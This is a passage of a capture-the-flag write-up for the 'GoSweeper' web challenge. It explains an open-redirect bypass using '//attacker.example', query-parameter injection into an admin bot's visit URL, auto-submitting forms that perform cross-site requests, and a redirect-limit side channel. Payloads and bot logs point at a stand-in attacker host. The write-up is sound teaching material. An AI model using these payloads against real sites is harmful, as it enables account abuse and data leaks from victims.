+</span><mark style="background-color:#3e4044;"><span>        </span><span style="color:#c594c5;">if </span><span>a</span><span style="color:#5fb3b3;">.</span><span>Scheme </span><span style="color:#5fb3b3;">!= &quot;&quot; &amp;&amp; </span><span>a</span><span style="color:#5fb3b3;">.</span><span>Host </span><span style="color:#5fb3b3;">!= </span><span>r</span><span style="color:#5fb3b3;">.</span><span>Host </span><span style="color:#5fb3b3;">{
+</span></mark><span>          http</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Error</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">, &quot;</span><span style="color:#99c794;">URL parameter is invalid</span><span style="color:#5fb3b3;">&quot;, </span><span>http</span><span style="color:#5fb3b3;">.</span><span>StatusBadRequest</span><span style="color:#5fb3b3;">)
+</span><span>          </span><span style="color:#c594c5;">return
+</span><span>        </span><span style="color:#5fb3b3;">}
+</span><span>      </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span>      </span><span style="color:#c594c5;">if </span><span>err </span><span style="color:#5fb3b3;">!= </span><span style="color:#f99157;">nil </span><span style="color:#5fb3b3;">{
+</span><span>        log</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Println</span><span style="color:#5fb3b3;">(</span><span>err</span><span style="color:#5fb3b3;">)
+</span><span>      </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span>      http</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Redirect</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">, </span><span>r</span><span style="color:#5fb3b3;">, </span><span>urlto</span><span style="color:#5fb3b3;">, </span><span>http</span><span style="color:#5fb3b3;">.</span><span>StatusFound</span><span style="color:#5fb3b3;">)
+</span><span>      </span><span style="color:#c594c5;">return
+</span><span>    </span><span style="color:#5fb3b3;">}
+</span><span>    next</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">ServeHTTP</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">, </span><span>r</span><span style="color:#5fb3b3;">)
+</span><span>  </span><span style="color:#5fb3b3;">})
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>As we can see from the code, there are certain checks in place to make
+sure this is either a relative URL or an absolute URL matching the challenge
+origin (i.e., <code>gosweeper.example</code>).
+Despite this, it is still possible to bypass these protections, since browsers
+interpret an URL starting with double slashes as absolute, but it does not
+have any scheme (i.e., its scheme is inferred from the scheme of the current
+website).
+For this reason, the URL <code>https://gosweeper.example.com?redirect=//attacker.example</code>
+causes a redirect to <code>https://attacker.example</code>.
+Now we just need to find a way to take advantage of this behaviour…</p>
+<h3 id="admin-bot">Admin Bot</h3>
+<p>Further inspection of the aforementioned admin check feature reveals that we control
+part of one of the URLs the bot (headless Chromium browser) visits.</p>
+<pre data-lang="go" style="background-color:#2b2c2f;color:#cccece;" class="language-go "><code class="language-go" data-lang="go"><span style="color:#c594c5;">func </span><span style="color:#6699cc;">checkBoardHandler</span><span style="color:#5fb3b3;">(</span><span style="color:#f99157;">w </span><span>http</span><span style="color:#5fb3b3;">.</span><span style="color:#c594c5;">ResponseWriter</span><span style="color:#5fb3b3;">, </span><span style="color:#f99157;">r </span><span style="color:#5fb3b3;">*</span><span>http</span><span style="color:#5fb3b3;">.</span><span style="color:#c594c5;">Request</span><span style="color:#5fb3b3;">) {
+</span><span>  </span><span style="color:#5f6364;">// ...
+</span><span>
+</span><span>  </span><span style="color:#5f6364;">// Parse the form
+</span><span>  err </span><span style="color:#5fb3b3;">= </span><span>r</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">ParseForm</span><span style="color:#5fb3b3;">()
+</span><span>  </span><span style="color:#c594c5;">if </span><span>err </span><span style="color:#5fb3b3;">!= </span><span style="color:#f99157;">nil </span><span style="color:#5fb3b3;">{
+</span><span>    log</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Println</span><span style="color:#5fb3b3;">(</span><span>err</span><span style="color:#5fb3b3;">)
+</span><span>    http</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Error</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">, &quot;</span><span style="color:#99c794;">Internal Server Error</span><span style="color:#5fb3b3;">&quot;, </span><span>http</span><span style="color:#5fb3b3;">.</span><span>StatusInternalServerError</span><span style="color:#5fb3b3;">)
+</span><span>    </span><span style="color:#c594c5;">return
+</span><span>  </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><mark style="background-color:#3e4044;"><span>  cloneid </span><span style="color:#5fb3b3;">:= </span><span>r</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">PostFormValue</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">cloneid</span><span style="color:#5fb3b3;">&quot;)
+</span></mark><span>
+</span><span>  </span><span style="color:#c594c5;">if </span><span>cloneid </span><span style="color:#5fb3b3;">== &quot;&quot; {
+</span><span>    s</span><span style="color:#5fb3b3;">, </span><span>err </span><span style="color:#5fb3b3;">:= </span><span>sessionStore</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Get</span><span style="color:#5fb3b3;">(</span><span>r</span><span style="color:#5fb3b3;">, &quot;</span><span style="color:#99c794;">session</span><span style="color:#5fb3b3;">&quot;)
+</span><span>    </span><span style="color:#c594c5;">if </span><span>err </span><span style="color:#5fb3b3;">!= </span><span style="color:#f99157;">nil </span><span style="color:#5fb3b3;">{
+</span><span>      log</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Println</span><span style="color:#5fb3b3;">(</span><span>err</span><span style="color:#5fb3b3;">)
+</span><span>      http</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Error</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">, &quot;</span><span style="color:#99c794;">Internal Server Error</span><span style="color:#5fb3b3;">&quot;, </span><span>http</span><span style="color:#5fb3b3;">.</span><span>StatusInternalServerError</span><span style="color:#5fb3b3;">)
+</span><span>      </span><span style="color:#c594c5;">return
+</span><span>    </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span>    cloneid</span><span style="color:#5fb3b3;">, </span><span style="color:#ec5f67;">_ </span><span style="color:#5fb3b3;">= </span><span>s</span><span style="color:#5fb3b3;">.</span><span>Values</span><span style="color:#5fb3b3;">[&quot;</span><span style="color:#99c794;">userid</span><span style="color:#5fb3b3;">&quot;].(</span><span style="color:#fac863;">string</span><span style="color:#5fb3b3;">)
+</span><span>
+</span><span>    </span><span style="color:#c594c5;">if </span><span>cloneid </span><span style="color:#5fb3b3;">== &quot;&quot; {
+</span><span>      http</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">Error</span><span style="color:#5fb3b3;">(</span><span>w</span><span style="color:#5fb3b3;">, &quot;</span><span style="color:#99c794;">Bad Request</span><span style="color:#5fb3b3;">&quot;, </span><span>http</span><span style="color:#5fb3b3;">.</span><span>StatusBadRequest</span><span style="color:#5fb3b3;">)
+</span><span>      </span><span style="color:#c594c5;">return
+</span><span>    </span><span style="color:#5fb3b3;">}
+</span><span>  </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span>  </span><span style="color:#5f6364;">// Call the bot
+</span><span>  data </span><span style="color:#5fb3b3;">:= </span><span style="color:#c594c5;">struct </span><span style="color:#5fb3b3;">{
+</span><span>    Actions </span><span style="color:#5fb3b3;">[]</span><span style="color:#c594c5;">interface</span><span style="color:#5fb3b3;">{} `</span><span style="color:#99c794;">json:&quot;actions&quot;</span><span style="color:#5fb3b3;">`
+</span><span>    Browser </span><span style="color:#fac863;">string        </span><span style="color:#5fb3b3;">`</span><span style="color:#99c794;">json:&quot;browser&quot;</span><span style="color:#5fb3b3;">`
+</span><span>  </span><span style="color:#5fb3b3;">}{
+</span><span>    Actions</span><span style="color:#5fb3b3;">: []</span><span style="color:#c594c5;">interface</span><span style="color:#5fb3b3;">{}{
+</span><span>      </span><span style="color:#5f6364;">// ...
+</span><span>      </span><span style="color:#c594c5;">map</span><span style="color:#5fb3b3;">[</span><span style="color:#fac863;">string</span><span style="color:#5fb3b3;">]</span><span style="color:#fac863;">string</span><span style="color:#5fb3b3;">{
+</span><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">type</span><span style="color:#5fb3b3;">&quot;: &quot;</span><span style="color:#99c794;">request</span><span style="color:#5fb3b3;">&quot;,
+</span><mark style="background-color:#3e4044;"><span>        </span><span style="color:#5fb3b3;">&quot;</span><span style="color:#99c794;">url</span><span style="color:#5fb3b3;">&quot;:  </span><span>CHALL_URL </span><span style="color:#5fb3b3;">+ &quot;</span><span style="color:#99c794;">/clone?cloneid=</span><span style="color:#5fb3b3;">&quot; + </span><span>cloneid</span><span style="color:#5fb3b3;">,
+</span></mark><span>      </span><span style="color:#5fb3b3;">},
+</span><span>      </span><span style="color:#5f6364;">// ...
+</span><span>    </span><span style="color:#5fb3b3;">},
+</span><span>    Browser</span><span style="color:#5fb3b3;">: &quot;</span><span style="color:#99c794;">chrome</span><span style="color:#5fb3b3;">&quot;,
+</span><span>  </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span>  </span><span style="color:#5f6364;">// ...
+</span><span style="color:#5fb3b3;">}
+</span></code></pre>
+<p>The endpoint accepts a <code>cloneid</code> parameter given in the POST request’s body,
+which if empty just defaults to the ID of the current user.
+This parameter is then passed as a query parameter to a URL the bot visits,
+but with no escaping whatsoever.
+This means that we can pass additional query parameters (e.g., the aforementioned
+<code>redirect</code> parameter) and get the bot to visit our own website, simply by sending
+<code>cloneid=something&amp;redirect=//attacker.example</code> in the body of the request.</p>
+<p>We can see this in action by sending a request using the following code in the
+browser’s console (or using your favourite HTTP client) and taking a look at the
+headless Chromium’s logs:</p>
+<pre data-lang="js" style="background-color:#2b2c2f;color:#cccece;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#6699cc;">fetch</span><span>(</span><span style="color:#5fb3b3;">`</span><span style="color:#99c794;">/checkboard</span><span style="color:#5fb3b3;">`, {
+</span><span>  method</span><span style="color:#5fb3b3;">: &#39;</span><span style="color:#99c794;">POST</span><span style="color:#5fb3b3;">&#39;,
+</span><span>  body</span><span style="color:#5fb3b3;">: new </span><span>URLSearchParams(</span><span style="color:#5fb3b3;">{
+</span><span>    cloneid</span><span style="color:#5fb3b3;">: &#39;</span><span style="color:#99c794;">something&amp;redirect=//attacker.example</span><span style="color:#5fb3b3;">&#39;,
+</span><span>  </span><span style="color:#5fb3b3;">}</span><span>)</span><span style="color:#5fb3b3;">,
+</span><span style="color:#5fb3b3;">}</span><span>)</span><span style="color:#5fb3b3;">;
+</span></code></pre>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>[INFO] time=4
+</span><span>[INFO] Sleeping for 4 seconds...
+</span><span>[DEBUG] What follows is a list of all the requests which have been performed by the browser:
+</span><span>[DEBUG]   - 200 https://accounts.google.com/ListAccounts?gpsia=1&amp;source=ChromiumBrowser&amp;json=standard
+</span><span>[DEBUG]   - 200 https://update.googleapis.com/service/update2/json?cup2key=13:uZY9aaXIKQsxzpLXZabR1vcg_15CqJ1jrffybVm5VM8&amp;cup2hreq=0bc0f2ab95433858138f92c381c78020f721e52187712d7bfbc035c0241f9914
+</span><span>[DEBUG]   - 200 http://edgedl.me.gvt1.com/edgedl/chromewebstore/L2Nocm9tZV9leHRlbnNpb24vYmxvYnMvYTBmQUFZUHRkSkgtb01uSGNvRHZ2Tm5HQQ/1.0.0.15_llkgjffcdpffmhiakmfcdcblohccpfmo.crx
+</span><span>[DEBUG]   - 200 https://update.googleapis.com/service/update2/json
+</span><span>[DEBUG]   - 200 https://update.googleapis.com/service/update2/json?cup2key=13:wAPwclgoQoguPMBkA2lMUoNigyPGWWCOkZ1lzJVrdWo&amp;cup2hreq=9fbcdeebd981821a4d766860571b378f3bb9d80d5bf8acecc0c112c631bf5314
+</span><span>[DEBUG]   - 200 https://gosweeper.example/login
+</span><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
+</span><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
+</span><span>[DEBUG]   - 404 https://gosweeper.example/favicon.ico
+</span><span>[DEBUG]   - 200 https://content-autofill.googleapis.com/v1/pages/ChNDaHJvbWUvMTIyLjAuNjI0OC4wEhkJqFiiaKxoaTESBQ2jwhVDIeiPPZAbjv6B?alt=proto
+</span><span>[DEBUG]   - 302 https://gosweeper.example/login
+</span><span>[DEBUG]   - 200 https://gosweeper.example/
+</span><span>[DEBUG]   - 302 https://gosweeper.example/clone?cloneid=something&amp;redirect=//attacker.example
+</span><mark style="background-color:#3e4044;"><span>[DEBUG]   - 200 https://attacker.example/
+</span></mark><span>[DEBUG]   - 302 https://gosweeper.example/board?xray=1
+</span><span>[DEBUG]   - 302 https://gosweeper.example/newboard
+</span><span>[DEBUG]   - 200 https://gosweeper.example/board
+</span><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
+</span><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
+</span></code></pre>
+<p>It is also worth noting that, as evidenced by the request to <code>/newboard</code>,
+the board isn’t being cloned, since the redirect middleware runs before the
+actual endpoint handler.</p>
+<h2 id="taking-control-of-the-admin-bot">Taking Control of the Admin Bot</h2>
+<p>Now that we can get the bot to visit our website (at least for 1 second), we
+need to figure out what to do with this capability.
+There are multiple interesting pieces of information that would be helpful
+to get ahold of, such as the bot ID (which has unlimited X-ray access) or the
+board in the X-ray view.
+Unfortunately, there are various countermeasures put in place (mainly by the browser)
+to make sure we cannot access this information:</p>
+<ul>
+<li>No <a rel="noopener nofollow noreferrer" target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">Cross-Origin Resource Sharing (CORS) header</a> is present, which
+means that, while we are able to make requests to <code>https://gosweeper.example</code>,
+the browser does not allow us to read anything from the response
+(including its status code);</li>
+<li>Additionally, the cookie’s <code>SameSite</code> attribute is unset, which
+<a rel="noopener nofollow noreferrer" target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#lax">defaults to <code>Lax</code></a>.
+This means that while we can make requests, they will be unauthenticated, which
+is rather useless.
+The only requests that are authentication are top-level navigations, that is,
+changing the page URL to that of <code>https://gosweeper.example/...</code>;</li>
+<li>Other security headers are also present, such as the
+<a rel="noopener nofollow noreferrer" target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy">Cross-Origin Opener Policy (COOP) header</a> and the
+<a rel="noopener nofollow noreferrer" target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Resource-Policy">Cross-Origin Resource Policy (CORP) header</a>.
+The former prevents an attacker from opening a pop-up and keeping a reference
+to its window object, while the latter prevents any webpage from loading
+resources from the challenge’s origin (e.g., images).
+None of these cause significant headaches, since for the former the browser
+already prevents cross-origin accesses to the DOM, and for the latter
+the lax cookie policy prevents the cookies from being sent at all.</li>
+</ul>
+<p>Fortunately for us, there is still something we can use to make authenticated
+requests to GoSweeper, even if we cannot (directly) obtain any information:
+<code>window.open</code>.
+While on a user-controlled browser pop-ups are blocked by default, <strong>on headless
+Chromium they are allowed</strong>, so we can open as many new tabs as we want.
+This is useful, for example, to actually clone the board, which only requires
+a GET request.
+The following attacker payload would result in getting the bot to clone the board
+as it was supposed to do before we forced a redirect, since it opens a new tab
+(top-level navigation) which includes the authentication cookie.</p>
+<pre data-lang="html" style="background-color:#2b2c2f;color:#cccece;" class="language-html "><code class="language-html" data-lang="html"><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">script</span><span style="color:#5fb3b3;">&gt;
+</span><span style="color:#fac863;">window</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">open</span><span style="color:#5fb3b3;">(&quot;</span><span style="color:#99c794;">https://gosweeper.example/clone?cloneid=fe24ecea6cf48d9604127b1204bb24fd</span><span style="color:#5fb3b3;">&quot;);
+</span><span style="color:#5fb3b3;">&lt;/</span><span style="color:#eb606b;">script</span><span style="color:#5fb3b3;">&gt;
+</span></code></pre>
+<p>Alternatively, and perhaps more flexibly, we can also use HTML forms, which
+allow us to do POST requests as well.
+As such, the example above can be rewritten as (notice <code>target="_blank"</code> in the
+form HTML to open it in a new tab):</p>
+<pre data-lang="html" style="background-color:#2b2c2f;color:#cccece;" class="language-html "><code class="language-html" data-lang="html"><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">form </span><span style="color:#bb80b3;">id</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">form-clone</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">method</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">get</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">action</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">https://gosweeper.example/clone</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">target</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">_blank</span><span style="color:#5fb3b3;">&quot;&gt;
+</span><span>  </span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">input </span><span style="color:#bb80b3;">type</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">hidden</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">name</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">cloneid</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">value</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">fe24ecea6cf48d9604127b1204bb24fd</span><span style="color:#5fb3b3;">&quot; /&gt;
+</span><span style="color:#5fb3b3;">&lt;/</span><span style="color:#eb606b;">form</span><span style="color:#5fb3b3;">&gt;
+</span><span>
+</span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">script</span><span style="color:#5fb3b3;">&gt;
+</span><span>  </span><span style="color:#fac863;">document</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">getElementById</span><span style="color:#5fb3b3;">(&#39;</span><span style="color:#99c794;">form-clone</span><span style="color:#5fb3b3;">&#39;).</span><span style="color:#6699cc;">submit</span><span style="color:#5fb3b3;">();
+</span><span style="color:#5fb3b3;">&lt;/</span><span style="color:#eb606b;">script</span><span style="color:#5fb3b3;">&gt;
+</span></code></pre>
+<p>We can see from the browser logs that the bot indeed successfully clones the board,
+since the request to <code>/board?xray=1</code> no longer redirects to <code>/newboard</code>!</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>[DEBUG] What follows is a list of all the requests which have been performed by the browser:
+</span><span>// ...
+</span><span>[DEBUG]   - 302 https://gosweeper.example/clone?cloneid=something&amp;redirect=//attacker.example
+</span><span>[DEBUG]   - 200 https://attacker.example/
+</span><mark style="background-color:#3e4044;"><span>[DEBUG]   - 200 https://gosweeper.example/clone?cloneid=fe24ecea6cf48d9604127b1204bb24fd
+</span></mark><span>[DEBUG]   - 404 https://attacker.example/favicon.ico
+</span><span>// ...
+</span><mark style="background-color:#3e4044;"><span>[DEBUG]   - 200 https://gosweeper.example/board?xray=1
+</span></mark><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
+</span><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
+</span></code></pre>
+<p>Now that we have successfully cloned the board, while still having an open tab
+with our malicious website open, we can try to make certain requests in order
+to hopefully extract information about the state of the board.
+Given that all traditional methods of getting information (e.g., sending a request
+using <code>fetch</code>) are blocked, we are left with just one option: side channels.</p>
+<h3 id="xsleaks">XSLeaks</h3>
+<p>As previously mentioned, side channels on the web are commonly referred to as
+Cross-Site Leaks (<a rel="noopener nofollow noreferrer" target="_blank" href="https://xsleaks.dev">XSLeaks</a>), and they allow an attacker (us) to infer information
+present in another origin (GoSweeper).
+Going through the XSLeaks Wiki reveals a number of approaches one could take,
+which mainly rely on having the website and/or browser exhibit
+different behaviour based on the state of the board.</p>
+<p>To take advantage of this, we first need to find a scenario in which a request
+is handled differently depending on certain actions.
+The challenge gives us the hint that we might not be able to get the whole board
+at once, since we are limited to 5 clones per board.
+Therefore, it is likely that we will only be able to infer whether a certain
+tile is a bomb.</p>
+<p>Upon inspecting the source code again, and recalling the already observed
+behaviour, the <code>/board</code> endpoint stands out as a good candidate, since it causes
+a redirect to <code>/newboard</code> if there isn’t an active game (i.e., right after
+we lose).
+This redirect behaviour can be detected by
+<a rel="noopener nofollow noreferrer" target="_blank" href="https://xsleaks.dev/docs/attacks/navigations/#max-redirects">exhausting the browser’s redirect limit</a>, which will cause an error
+if <code>/board</code> redirects, but proceed normally otherwise.
+More concretely, the Chromium browser has a limit of 20 redirects (in one go);
+if we perform 19 redirects somewhere else and then redirect to <code>/board</code>, we
+are able to know if the logged in user has an active game or not.</p>
+<p>For this side channel to be useful, we first need a way to manipulate the state
+in a way that will give us relevant information.
+To achieve this, we can make a guess on a tile (using the <code>/guess</code> endpoint):
+if that guess is a bomb, the game will end and the bot user will not have
+an active game anymore; otherwise, the tile will be revealed and nothing else
+will happen.
+Using this, we now have a clear way to figure out whether a given tile is a bomb
+(i.e., an oracle).</p>
+<p>So, recapping the plan:</p>
+<ol>
+<li>Clone the board using the admin bot;</li>
+<li>Make the bot take a guess on the tile we want to reveal;</li>
+<li>Make the bot navigate to the board page and detect whether there is an active
+game, revealing the contents of the guessed tile;</li>
+<li>Send this information back to us.</li>
+</ol>
+<p>These are a lot of actions to take in just one second (and the redirects, especially,
+seem to take a lot of time to execute in the headless browser), so we need a way
+to persist after that.
+Thankfully, this is not very difficult, since we can just open a new tab from
+the initial page, giving us another 4 seconds until the browser is killed:</p>
+<pre data-lang="html" style="background-color:#2b2c2f;color:#cccece;" class="language-html "><code class="language-html" data-lang="html"><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">form </span><span style="color:#bb80b3;">id</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">form-clone</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">method</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">get</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">action</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">https://gosweeper.example/clone</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">target</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">_blank</span><span style="color:#5fb3b3;">&quot;&gt;
+</span><span>  </span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">input </span><span style="color:#bb80b3;">type</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">hidden</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">name</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">cloneid</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">value</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">fe24ecea6cf48d9604127b1204bb24fd</span><span style="color:#5fb3b3;">&quot; /&gt;
+</span><span style="color:#5fb3b3;">&lt;/</span><span style="color:#eb606b;">form</span><span style="color:#5fb3b3;">&gt;
+</span><span>
+</span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">script</span><span style="color:#5fb3b3;">&gt;
+</span><span>  </span><span style="color:#fac863;">document</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">getElementById</span><span style="color:#5fb3b3;">(&#39;</span><span style="color:#99c794;">form-clone</span><span style="color:#5fb3b3;">&#39;).</span><span style="color:#6699cc;">submit</span><span style="color:#5fb3b3;">();
+</span><mark style="background-color:#3e4044;"><span>  </span><span style="color:#fac863;">window</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">open</span><span style="color:#5fb3b3;">(&#39;</span><span style="color:#99c794;">/persist.html</span><span style="color:#5fb3b3;">&#39;);
+</span></mark><span style="color:#5fb3b3;">&lt;/</span><span style="color:#eb606b;">script</span><span style="color:#5fb3b3;">&gt;
+</span></code></pre>
+<p>Since we are doing further requests mutating the state of the board, we need to
+wait for the <code>/board?xray=1</code> request to be sent first, otherwise it would generate
+a new board if the tile we are guessing is a bomb, rendering the side channel useless.
+My first approach for this was to use <code>setTimeout</code>, waiting a certain number of milliseconds,
+but this proved to be quite unreliable, since the time the new tab takes to load can vary.
+To combat this problem, I injected an event handler in the “main” tab that would tell
+this new <code>/persist.html</code> tab that it was navigating somewhere else
+(i.e., the deprecated <a rel="noopener nofollow noreferrer" target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event"><code>unload</code> event</a>).
+This is only possible because both pages are from the same origin (i.e., <code>https://attacker.example</code>),
+so <a rel="noopener nofollow noreferrer" target="_blank" href="https://developer.mozilla.org/en-US/docs/Web/API/Window/opener"><code>window.opener</code></a> in the second tab points back to the first one and is able
+to interact with it.</p>
+<p>As such, this is what our <code>persist.html</code> looks like now, making a guess on tile 0 (the top-left corner)
+after the bot navigates away from its opener:</p>
+<pre data-lang="html" style="background-color:#2b2c2f;color:#cccece;" class="language-html "><code class="language-html" data-lang="html"><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">form </span><span style="color:#bb80b3;">id</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">form-guess</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">method</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">post</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">action</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">https://gosweeper.example/guess</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">target</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">_blank</span><span style="color:#5fb3b3;">&quot;&gt;
+</span><span>  </span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">input </span><span style="color:#bb80b3;">type</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">hidden</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">name</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">guess</span><span style="color:#5fb3b3;">&quot; </span><span style="color:#bb80b3;">value</span><span style="color:#5fb3b3;">=&quot;</span><span style="color:#99c794;">0</span><span style="color:#5fb3b3;">&quot; /&gt;
+</span><span style="color:#5fb3b3;">&lt;/</span><span style="color:#eb606b;">form</span><span style="color:#5fb3b3;">&gt;
+</span><span>
+</span><span style="color:#5fb3b3;">&lt;</span><span style="color:#eb606b;">script</span><span style="color:#5fb3b3;">&gt;
+</span><span>  </span><span style="color:#fac863;">window</span><span style="color:#5fb3b3;">.</span><span style="color:#fac863;">opener</span><span style="color:#5fb3b3;">.</span><span>onunload </span><span style="color:#5fb3b3;">= () </span><span style="color:#c594c5;">=&gt; </span><span style="color:#5fb3b3;">{
+</span><span>    </span><span style="color:#fac863;">document</span><span style="color:#5fb3b3;">.</span><span style="color:#6699cc;">getElementById</span><span style="color:#5fb3b3;">(&#39;</span><span style="color:#99c794;">form-guess</span><span style="color:#5fb3b3;">&#39;).</span><span style="color:#6699cc;">submit</span><span style="color:#5fb3b3;">()
+</span><span style="color:#6699cc;">    </span><span style="color:#5f6364;">// TODO
+</span><span>  </span><span style="color:#5fb3b3;">}
+</span><span>
+</span><span style="color:#5fb3b3;">&lt;/</span><span style="color:#eb606b;">script</span><span style="color:#5fb3b3;">&gt;
+</span></code></pre>
+<p>Again, looking at the headless Chromium bots reveals that this is working as intended, with the
+request to <code>/guess</code> being sent immediately after the one sent to <code>/board?xray=1</code>.</p>
+<pre style="background-color:#2b2c2f;color:#cccece;"><code><span>[DEBUG] What follows is a list of all the requests which have been performed by the browser:
+</span><span>// ...
+</span><span>[DEBUG]   - 302 https://gosweeper.example/clone?cloneid=something&amp;redirect=//attacker.example
+</span><span>[DEBUG]   - 200 https://attacker.example/
+</span><span>[DEBUG]   - 200 https://gosweeper.example/clone?cloneid=fe24ecea6cf48d9604127b1204bb24fd
+</span><span>[DEBUG]   - 200 https://attacker.example/persist.html
+</span><span>[DEBUG]   - 404 https://attacker.example/favicon.ico
+</span><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
+</span><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
+</span><mark style="background-color:#3e4044;"><span>[DEBUG]   - 200 https://gosweeper.example/board?xray=1
+</span></mark><mark style="background-color:#3e4044;"><span>[DEBUG]   - 200 https://gosweeper.example/guess
+</span></mark><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css
+</span><span>[DEBUG]   - 200 https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js
+</span></code></pre>
+<p>The only thing left now is to detect whether there is still an active game after making
+the guess.
+Since we cannot use <code>fetch</code>, given that it would not include a cookie, we have to rely
+on opening a new tab once again.
+Here, an interesting behaviour emerges: if we reach the maximum number of redirects,
+the window’s origin will be <code>about:blank</code>, which is accessible from any origin;
+otherwise, the origin will be <code>https://gosweeper.example</code> and we will not be able
+to access any content of the window.
